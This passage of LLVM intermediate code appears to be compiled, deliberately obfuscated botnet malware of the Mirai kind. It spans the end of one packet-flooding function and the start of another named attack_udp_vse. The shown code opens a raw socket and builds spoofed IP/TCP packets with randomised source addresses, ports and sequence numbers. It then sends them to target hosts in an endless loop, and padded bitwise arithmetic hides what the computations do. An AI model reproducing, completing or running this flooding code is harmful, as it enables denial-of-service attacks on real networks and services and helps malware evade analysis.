  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %21, align 1
  %78 = load i8, i8* %7, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 13, i32 0)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %22, align 1
  %82 = load i8, i8* %7, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 14, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %23, align 1
  %86 = load i8, i8* %7, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 15, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %24, align 1
  %90 = load i8, i8* %7, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 16, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %25, align 1
  %94 = load i8, i8* %7, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %96 = load i32, i32* @LOCAL_ADDR, align 4
  %97 = call i32 @attack_get_opt_ip(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 25, i32 %96)
  store i32 %97, i32* %26, align 4
  %98 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %98, i32* %10, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %4
  br label %616

; <label>:101:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %102 = load i32, i32* %10, align 4
  %103 = bitcast i32* %9 to i8*
  %104 = call i32 @setsockopt(i32 %102, i32 0, i32 3, i8* %103, i32 4) #6
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  br label %616

; <label>:109:                                    ; preds = %101
  store i32 0, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %434, %109
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  br i1 %114, label %115, label %440

; <label>:115:                                    ; preds = %110
  %116 = bitcast [256 x i8*]* %30 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %116, i8* bitcast ([256 x i8*]* @attack_udp_ovhhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %117 = call i32 @rand() #6
  %118 = srem i32 %117, 256
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [256 x i8*], [256 x i8*]* %30, i64 0, i64 %119
  %121 = load i8*, i8** %120, align 8
  store i8* %121, i8** %31, align 8
  %122 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %123 = load i8**, i8*** %11, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %11, align 8
  %128 = load i32, i32* %9, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %27, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.tcphdr*
  store %struct.tcphdr* %135, %struct.tcphdr** %28, align 8
  %136 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i64 1
  %138 = bitcast %struct.tcphdr* %137 to i8*
  store i8* %138, i8** %29, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = xor i8 %141, -1
  %143 = xor i8 15, -1
  %144 = xor i8 -25, -1
  %145 = or i8 %142, %143
  %146 = or i8 -25, %144
  %147 = xor i8 %145, -1
  %148 = and i8 %147, %146
  %149 = and i8 %141, 15
  %150 = and i8 %148, 64
  %151 = xor i8 %148, 64
  %152 = or i8 %150, %151
  %153 = or i8 %148, 64
  store i8 %152, i8* %140, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = xor i8 -16, -1
  %158 = xor i8 %156, %157
  %159 = and i8 %158, %156
  %160 = and i8 %156, -16
  %161 = and i8 %159, 5
  %162 = xor i8 %159, 5
  %163 = or i8 %161, %162
  %164 = or i8 %159, 5
  store i8 %163, i8* %155, align 4
  %165 = load i8, i8* %12, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext 60) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %13, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %15, align 1
  %179 = icmp ne i8 %178, 0
  br i1 %179, label %180, label %184

; <label>:180:                                    ; preds = %115
  %181 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i16 %181, i16* %183, align 2
  br label %184

; <label>:184:                                    ; preds = %180, %115
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 6
  store i8 6, i8* %186, align 1
  %187 = load i32, i32* %26, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 8
  store i32 %187, i32* %189, align 4
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 9
  store i32 %195, i32* %197, align 4
  %198 = load i16, i16* %16, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  store i16 %199, i16* %201, align 4
  %202 = load i16, i16* %17, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 1
  store i16 %203, i16* %205, align 2
  %206 = load i32, i32* %18, align 4
  %207 = trunc i32 %206 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = zext i16 %208 to i32
  %210 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 2
  store i32 %209, i32* %211, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = xor i16 -241, -1
  %216 = xor i16 %214, %215
  %217 = and i16 %216, %214
  %218 = and i16 %214, -241
  %219 = and i16 %217, 160
  %220 = xor i16 %217, 160
  %221 = or i16 %219, %220
  %222 = or i16 %217, 160
  store i16 %221, i16* %213, align 4
  %223 = load i8, i8* %20, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %224, -1
  %229 = xor i16 1, -1
  %230 = xor i16 -25216, -1
  %231 = or i16 %228, %229
  %232 = or i16 -25216, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %224, 1
  %236 = shl i16 %234, 13
  %237 = xor i16 -8193, -1
  %238 = xor i16 %227, %237
  %239 = and i16 %238, %227
  %240 = and i16 %227, -8193
  %241 = xor i16 %239, -1
  %242 = xor i16 %236, -1
  %243 = xor i16 13975, -1
  %244 = and i16 %241, 13975
  %245 = and i16 %239, %243
  %246 = and i16 %242, 13975
  %247 = and i16 %236, %243
  %248 = or i16 %244, %245
  %249 = or i16 %246, %247
  %250 = xor i16 %248, %249
  %251 = or i16 %241, %242
  %252 = xor i16 %251, -1
  %253 = or i16 13975, %243
  %254 = and i16 %252, %253
  %255 = or i16 %250, %254
  %256 = or i16 %239, %236
  store i16 %255, i16* %226, align 4
  %257 = load i8, i8* %21, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = xor i16 1, -1
  %263 = xor i16 %258, %262
  %264 = and i16 %263, %258
  %265 = and i16 %258, 1
  %266 = shl i16 %264, 12
  %267 = xor i16 %261, -1
  %268 = xor i16 -4097, -1
  %269 = xor i16 -2012, -1
  %270 = or i16 %267, %268
  %271 = or i16 -2012, %269
  %272 = xor i16 %270, -1
  %273 = and i16 %272, %271
  %274 = and i16 %261, -4097
  %275 = xor i16 %273, -1
  %276 = xor i16 %266, -1
  %277 = xor i16 25647, -1
  %278 = and i16 %275, 25647
  %279 = and i16 %273, %277
  %280 = and i16 %276, 25647
  %281 = and i16 %266, %277
  %282 = or i16 %278, %279
  %283 = or i16 %280, %281
  %284 = xor i16 %282, %283
  %285 = or i16 %275, %276
  %286 = xor i16 %285, -1
  %287 = or i16 25647, %277
  %288 = and i16 %286, %287
  %289 = or i16 %284, %288
  %290 = or i16 %273, %266
  store i16 %289, i16* %260, align 4
  %291 = load i8, i8* %22, align 1
  %292 = sext i8 %291 to i16
  %293 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = xor i16 1, -1
  %297 = xor i16 %292, %296
  %298 = and i16 %297, %292
  %299 = and i16 %292, 1
  %300 = shl i16 %298, 11
  %301 = xor i16 %295, -1
  %302 = xor i16 -2049, -1
  %303 = xor i16 -9580, -1
  %304 = or i16 %301, %302
  %305 = or i16 -9580, %303
  %306 = xor i16 %304, -1
  %307 = and i16 %306, %305
  %308 = and i16 %295, -2049
  %309 = and i16 %307, %300
  %310 = xor i16 %307, %300
  %311 = or i16 %309, %310
  %312 = or i16 %307, %300
  store i16 %311, i16* %294, align 4
  %313 = load i8, i8* %23, align 1
  %314 = sext i8 %313 to i16
  %315 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 4
  %317 = load i16, i16* %316, align 4
  %318 = xor i16 1, -1
  %319 = xor i16 %314, %318
  %320 = and i16 %319, %314
  %321 = and i16 %314, 1
  %322 = shl i16 %320, 10
  %323 = xor i16 -1025, -1
  %324 = xor i16 %317, %323
  %325 = and i16 %324, %317
  %326 = and i16 %317, -1025
  %327 = xor i16 %325, -1
  %328 = xor i16 %322, -1
  %329 = xor i16 -5742, -1
  %330 = and i16 %327, -5742
  %331 = and i16 %325, %329
  %332 = and i16 %328, -5742
  %333 = and i16 %322, %329
  %334 = or i16 %330, %331
  %335 = or i16 %332, %333
  %336 = xor i16 %334, %335
  %337 = or i16 %327, %328
  %338 = xor i16 %337, -1
  %339 = or i16 -5742, %329
  %340 = and i16 %338, %339
  %341 = or i16 %336, %340
  %342 = or i16 %325, %322
  store i16 %341, i16* %316, align 4
  %343 = load i8, i8* %24, align 1
  %344 = sext i8 %343 to i16
  %345 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %346 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = xor i16 %344, -1
  %349 = xor i16 1, -1
  %350 = xor i16 3652, -1
  %351 = or i16 %348, %349
  %352 = or i16 3652, %350
  %353 = xor i16 %351, -1
  %354 = and i16 %353, %352
  %355 = and i16 %344, 1
  %356 = shl i16 %354, 9
  %357 = xor i16 -513, -1
  %358 = xor i16 %347, %357
  %359 = and i16 %358, %347
  %360 = and i16 %347, -513
  %361 = and i16 %359, %356
  %362 = xor i16 %359, %356
  %363 = or i16 %361, %362
  %364 = or i16 %359, %356
  store i16 %363, i16* %346, align 4
  %365 = load i8, i8* %25, align 1
  %366 = sext i8 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = xor i16 %366, -1
  %371 = xor i16 1, -1
  %372 = xor i16 -2243, -1
  %373 = or i16 %370, %371
  %374 = or i16 -2243, %372
  %375 = xor i16 %373, -1
  %376 = and i16 %375, %374
  %377 = and i16 %366, 1
  %378 = shl i16 %376, 8
  %379 = xor i16 -257, -1
  %380 = xor i16 %369, %379
  %381 = and i16 %380, %369
  %382 = and i16 %369, -257
  %383 = and i16 %381, %378
  %384 = xor i16 %381, %378
  %385 = or i16 %383, %384
  %386 = or i16 %381, %378
  store i16 %385, i16* %368, align 4
  %387 = load i8*, i8** %29, align 8
  %388 = getelementptr inbounds i8, i8* %387, i32 1
  store i8* %388, i8** %29, align 8
  store i8 2, i8* %387, align 1
  %389 = load i8*, i8** %29, align 8
  %390 = getelementptr inbounds i8, i8* %389, i32 1
  store i8* %390, i8** %29, align 8
  store i8 4, i8* %389, align 1
  %391 = call i32 @rand_next()
  %392 = xor i32 %391, -1
  %393 = xor i32 15, -1
  %394 = xor i32 1633392583, -1
  %395 = or i32 %392, %393
  %396 = or i32 1633392583, %394
  %397 = xor i32 %395, -1
  %398 = and i32 %397, %396
  %399 = and i32 %391, 15
  %400 = sub i32 0, %398
  %401 = sub i32 1400, %400
  %402 = add i32 1400, %398
  %403 = trunc i32 %401 to i16
  %404 = call zeroext i16 @htons(i16 zeroext %403) #7
  %405 = load i8*, i8** %29, align 8
  %406 = bitcast i8* %405 to i16*
  store i16 %404, i16* %406, align 2
  %407 = load i8*, i8** %29, align 8
  %408 = getelementptr inbounds i8, i8* %407, i64 2
  store i8* %408, i8** %29, align 8
  %409 = load i8*, i8** %29, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %29, align 8
  store i8 4, i8* %409, align 1
  %411 = load i8*, i8** %29, align 8
  %412 = getelementptr inbounds i8, i8* %411, i32 1
  store i8* %412, i8** %29, align 8
  store i8 2, i8* %411, align 1
  %413 = load i8*, i8** %29, align 8
  %414 = getelementptr inbounds i8, i8* %413, i32 1
  store i8* %414, i8** %29, align 8
  store i8 8, i8* %413, align 1
  %415 = load i8*, i8** %29, align 8
  %416 = getelementptr inbounds i8, i8* %415, i32 1
  store i8* %416, i8** %29, align 8
  store i8 10, i8* %415, align 1
  %417 = call i32 @rand_next()
  %418 = load i8*, i8** %29, align 8
  %419 = bitcast i8* %418 to i32*
  store i32 %417, i32* %419, align 4
  %420 = load i8*, i8** %29, align 8
  %421 = getelementptr inbounds i8, i8* %420, i64 4
  store i8* %421, i8** %29, align 8
  %422 = load i8*, i8** %29, align 8
  %423 = bitcast i8* %422 to i32*
  store i32 0, i32* %423, align 4
  %424 = load i8*, i8** %29, align 8
  %425 = getelementptr inbounds i8, i8* %424, i64 4
  store i8* %425, i8** %29, align 8
  %426 = load i8*, i8** %29, align 8
  %427 = getelementptr inbounds i8, i8* %426, i32 1
  store i8* %427, i8** %29, align 8
  store i8 1, i8* %426, align 1
  %428 = load i8*, i8** %29, align 8
  %429 = getelementptr inbounds i8, i8* %428, i32 1
  store i8* %429, i8** %29, align 8
  store i8 3, i8* %428, align 1
  %430 = load i8*, i8** %29, align 8
  %431 = getelementptr inbounds i8, i8* %430, i32 1
  store i8* %431, i8** %29, align 8
  store i8 3, i8* %430, align 1
  %432 = load i8*, i8** %29, align 8
  %433 = getelementptr inbounds i8, i8* %432, i32 1
  store i8* %433, i8** %29, align 8
  store i8 6, i8* %432, align 1
  br label %434

; <label>:434:                                    ; preds = %184
  %435 = load i32, i32* %9, align 4
  %436 = add i32 %435, 340600314
  %437 = add i32 %436, 1
  %438 = sub i32 %437, 340600314
  %439 = add nsw i32 %435, 1
  store i32 %438, i32* %9, align 4
  br label %110

; <label>:440:                                    ; preds = %110
  br label %441

; <label>:441:                                    ; preds = %615, %440
  store i32 0, i32* %9, align 4
  br label %442

; <label>:442:                                    ; preds = %608, %441
  %443 = load i32, i32* %9, align 4
  %444 = load i8, i8* %5, align 1
  %445 = zext i8 %444 to i32
  %446 = icmp slt i32 %443, %445
  br i1 %446, label %447, label %615

; <label>:447:                                    ; preds = %442
  %448 = load i8**, i8*** %11, align 8
  %449 = load i32, i32* %9, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds i8*, i8** %448, i64 %450
  %452 = load i8*, i8** %451, align 8
  store i8* %452, i8** %32, align 8
  %453 = load i8*, i8** %32, align 8
  %454 = bitcast i8* %453 to %struct.iphdr*
  store %struct.iphdr* %454, %struct.iphdr** %33, align 8
  %455 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i64 1
  %457 = bitcast %struct.iphdr* %456 to %struct.tcphdr*
  store %struct.tcphdr* %457, %struct.tcphdr** %34, align 8
  %458 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %459 = load i32, i32* %9, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %458, i64 %460
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i32 0, i32 2
  %463 = load i8, i8* %462, align 4
  %464 = zext i8 %463 to i32
  %465 = icmp slt i32 %464, 32
  br i1 %465, label %466, label %490

; <label>:466:                                    ; preds = %447
  %467 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %468 = load i32, i32* %9, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i64 %469
  %471 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %470, i32 0, i32 1
  %472 = load i32, i32* %471, align 4
  %473 = call i32 @ntohl(i32 %472) #7
  %474 = call i32 @rand_next()
  %475 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %476 = load i32, i32* %9, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 2
  %480 = load i8, i8* %479, align 4
  %481 = zext i8 %480 to i32
  %482 = lshr i32 %474, %481
  %483 = sub i32 %473, 436348992
  %484 = add i32 %483, %482
  %485 = add i32 %484, 436348992
  %486 = add i32 %473, %482
  %487 = call i32 @htonl(i32 %485) #7
  %488 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 9
  store i32 %487, i32* %489, align 4
  br label %490

; <label>:490:                                    ; preds = %466, %447
  %491 = load i32, i32* %26, align 4
  %492 = icmp eq i32 %491, -1
  br i1 %492, label %493, label %497

; <label>:493:                                    ; preds = %490
  %494 = call i32 @rand_next()
  %495 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 8
  store i32 %494, i32* %496, align 4
  br label %497

; <label>:497:                                    ; preds = %493, %490
  %498 = load i16, i16* %13, align 2
  %499 = zext i16 %498 to i32
  %500 = icmp eq i32 %499, 65535
  br i1 %500, label %501, label %510

; <label>:501:                                    ; preds = %497
  %502 = call i32 @rand_next()
  %503 = xor i32 65535, -1
  %504 = xor i32 %502, %503
  %505 = and i32 %504, %502
  %506 = and i32 %502, 65535
  %507 = trunc i32 %505 to i16
  %508 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 3
  store i16 %507, i16* %509, align 4
  br label %510

; <label>:510:                                    ; preds = %501, %497
  %511 = load i16, i16* %16, align 2
  %512 = zext i16 %511 to i32
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %527

; <label>:514:                                    ; preds = %510
  %515 = call i32 @rand_next()
  %516 = xor i32 %515, -1
  %517 = xor i32 65535, -1
  %518 = xor i32 1389939089, -1
  %519 = or i32 %516, %517
  %520 = or i32 1389939089, %518
  %521 = xor i32 %519, -1
  %522 = and i32 %521, %520
  %523 = and i32 %515, 65535
  %524 = trunc i32 %522 to i16
  %525 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i32 0, i32 0
  store i16 %524, i16* %526, align 4
  br label %527

; <label>:527:                                    ; preds = %514, %510
  %528 = load i16, i16* %17, align 2
  %529 = zext i16 %528 to i32
  %530 = icmp eq i32 %529, 65535
  br i1 %530, label %531, label %544

; <label>:531:                                    ; preds = %527
  %532 = call i32 @rand_next()
  %533 = xor i32 %532, -1
  %534 = xor i32 65535, -1
  %535 = xor i32 -1145524715, -1
  %536 = or i32 %533, %534
  %537 = or i32 -1145524715, %535
  %538 = xor i32 %536, -1
  %539 = and i32 %538, %537
  %540 = and i32 %532, 65535
  %541 = trunc i32 %539 to i16
  %542 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 1
  store i16 %541, i16* %543, align 2
  br label %544

; <label>:544:                                    ; preds = %531, %527
  %545 = load i32, i32* %18, align 4
  %546 = icmp eq i32 %545, 65535
  br i1 %546, label %547, label %551

; <label>:547:                                    ; preds = %544
  %548 = call i32 @rand_next()
  %549 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  br label %551

; <label>:551:                                    ; preds = %547, %544
  %552 = load i32, i32* %19, align 4
  %553 = icmp eq i32 %552, 65535
  br i1 %553, label %554, label %558

; <label>:554:                                    ; preds = %551
  %555 = call i32 @rand_next()
  %556 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 3
  store i32 %555, i32* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %554, %551
  %559 = load i8, i8* %20, align 1
  %560 = icmp ne i8 %559, 0
  br i1 %560, label %561, label %570

; <label>:561:                                    ; preds = %558
  %562 = call i32 @rand_next()
  %563 = xor i32 65535, -1
  %564 = xor i32 %562, %563
  %565 = and i32 %564, %562
  %566 = and i32 %562, 65535
  %567 = trunc i32 %565 to i16
  %568 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 7
  store i16 %567, i16* %569, align 2
  br label %570

; <label>:570:                                    ; preds = %561, %558
  %571 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %572 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %571, i32 0, i32 7
  store i16 0, i16* %572, align 2
  %573 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %574 = bitcast %struct.iphdr* %573 to i16*
  %575 = call zeroext i16 @checksum_generic(i16* %574, i32 20)
  %576 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %577 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %576, i32 0, i32 7
  store i16 %575, i16* %577, align 2
  %578 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 6
  store i16 0, i16* %579, align 4
  %580 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %581 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %582 = bitcast %struct.tcphdr* %581 to i8*
  %583 = call zeroext i16 @htons(i16 zeroext 40) #7
  %584 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %580, i8* %582, i16 zeroext %583, i32 40)
  %585 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 6
  store i16 %584, i16* %586, align 4
  %587 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 1
  %589 = load i16, i16* %588, align 2
  %590 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %591 = load i32, i32* %9, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i64 %592
  %594 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %593, i32 0, i32 0
  %595 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %594, i32 0, i32 1
  store i16 %589, i16* %595, align 2
  %596 = load i32, i32* %10, align 4
  %597 = load i8*, i8** %32, align 8
  %598 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %599 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %600 = load i32, i32* %9, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = bitcast %struct.sockaddr_in* %603 to %struct.sockaddr*
  store %struct.sockaddr* %604, %struct.sockaddr** %598, align 8
  %605 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %606 = load %struct.sockaddr*, %struct.sockaddr** %605, align 8
  %607 = call i64 @sendto(i32 %596, i8* %597, i64 60, i32 16384, %struct.sockaddr* %606, i32 16)
  br label %608

; <label>:608:                                    ; preds = %570
  %609 = load i32, i32* %9, align 4
  %610 = sub i32 0, %609
  %611 = sub i32 0, 1
  %612 = add i32 %610, %611
  %613 = sub i32 0, %612
  %614 = add nsw i32 %609, 1
  store i32 %613, i32* %9, align 4
  br label %442

; <label>:615:                                    ; preds = %442
  br label %441

; <label>:616:                                    ; preds = %106, %100
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
